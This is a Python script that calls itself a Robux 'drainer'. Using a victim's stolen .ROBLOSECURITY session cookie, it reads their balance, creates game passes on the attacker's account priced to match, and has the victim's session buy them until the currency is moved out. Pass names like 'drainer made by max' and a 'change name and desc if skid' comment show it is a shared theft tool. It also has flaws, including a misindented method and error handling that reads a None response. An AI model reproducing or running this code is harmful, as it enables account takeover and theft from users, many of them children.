import requests
import logging
import time
import random

class RobloxHelper:
    def __init__(self):
        self.session = requests.Session()

    def _make_request(self, method, url, **kwargs):
        try:
            response = self.session.request(method, url, **kwargs)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return None

    def obtain_csrf(self, cookie):
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        response = self._make_request("POST", "https://auth.roblox.com/v2/logout", headers=headers)
        if response:
            return response.headers.get('X-Csrf-Token')
        return None

    def change_price(self, cookie, csrf, gamepass_id, price):
        url = f"https://apis.roblox.com/game-passes/v1/game-passes/{gamepass_id}/details"
        data = {"IsForSale": True, "Price": price}
        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "X-Csrf-Token": csrf}
        response = self._make_request("POST", url, json=data, headers=headers)
        if response:
            logging.info(f"Successfully changed price of gamepass {gamepass_id} to {price}")
        else:
            logging.error(f"Failed to change price of gamepass {gamepass_id} to {price}")
            logging.error(f"Error code: {response.status_code}")
            logging.error(f"Error: {response.text}")

    def upload_gamepass(self, cookie, csrf, name, description, universe_id):
        url = "https://apis.roblox.com/game-passes/v1/game-passes"
        data = {"Name": name, "Description": description, "UniverseId": universe_id, "File": None, "AssetId": None}
        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "X-Csrf-Token": csrf}
        response = self._make_request("POST", url, data=data, headers=headers)
        if response:
            logging.info("Successfully uploaded gamepass")
            return response.json().get('gamePassId')
        else:
            logging.error("Failed to upload gamepass")
            logging.error(f"Error code: {response.status_code}")
            logging.error(f"Error: {response.text}")
            return None
            
     def get_user_id(self, cookie):
        url = "https://users.roblox.com/v1/users/authenticated"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        response = self._make_request("POST", url, headers=headers)
        if response:
           return response.json().get('id')

    def scan_for_place(self, cookie):
        url = "https://users.roblox.com/v1/users/authenticated"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        response = self._make_request("POST", url, headers=headers)
        if response:
            user_id = response.json().get('id')
            url = f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=10&sortOrder=Desc"
            response = self._make_request("GET", url, headers=headers)
            if response:
                places = response.json().get('data')
                place = random.choice(places)
                return place.get('id')
        return None

    def purchase_gamepass(self, cookie, csrf, gamepass_id, user_id):
        gamepass_url = f"https://apis.roblox.com/game-passes/v1/game-passes/{gamepass_id}/product-info"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        response = self._make_request("GET", gamepass_url, headers=headers)
        if not response:
            return None

        gamepass_price = response.json().get('PriceInRobux')
        purchase_url = f"https://economy.roblox.com/v1/purchases/products/{gamepass_id}"
        data = {"expectedCurrency": 1, "expectedPrice": gamepass_price, "expectedSellerId": user_id}
        headers = {"Cookie": f".ROBLOSECURITY={cookie}", "X-Csrf-Token": csrf}
        response = self._make_request("POST", purchase_url, json=data, headers=headers)

        if response:
            logging.info(f"Successfully purchased gamepass {gamepass_id}")
        else:
            logging.error(f"Failed to purchase gamepass {gamepass_id}")
            logging.error(f"Error code: {response.status_code}")
            logging.error(f"Error: {response.text}")

    def check_robux(self, cookie, user_id):
        url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        response = self._make_request("GET", url, headers=headers)
        if response:
            robux = response.json().get('robux')
            return robux
        return None

    @staticmethod
    def divide_amount(amount):
        amount_str = str(amount)
        num_digits = len(amount_str)
        instance1 = 0
        instance2 = 0
        instance3 = 0

        if num_digits >= 4:
            instance1 = int(amount_str[:-3] + '000')
            amount -= instance1
        if num_digits >= 3:
            instance3 = int(amount_str[-3])
            amount -= instance3
        instance2 = amount

        amount_list = [instance1, instance2, instance3]
        return [val for val in amount_list if val > 0]

if __name__ == "__main__":
    cookie = "cookie"
    target_cookie = "target cookie"
    roblox_helper = RobloxHelper()
    csrf = roblox_helper.obtain_csrf(cookie)
    target_csrf = roblox_helper.obtain_csrf(target_cookie)
    target_userid = roblox_helper.get_user_id(cookie)
    robux = roblox_helper.check_robux(target_cookie, target_userid)
    universe_id = roblox_helper.scan_for_place(cookie)

    time.sleep(3)

    if robux:
        amount_list = roblox_helper.divide_amount(robux)
        for i in amount_list:
            upload = roblox_helper.upload_gamepass(cookie, csrf, "drainer made by max", "max owns u\nmax runs u", universe_id) # change name and desc if skid
            if upload:
                roblox_helper.change_price(cookie, csrf, upload, i)
                roblox_helper.purchase_gamepass(target_cookie, target_csrf, upload, target_userid)
                time.sleep(5)

        logging.info(f"Successfully drained {robux} robux from {target_userid}")
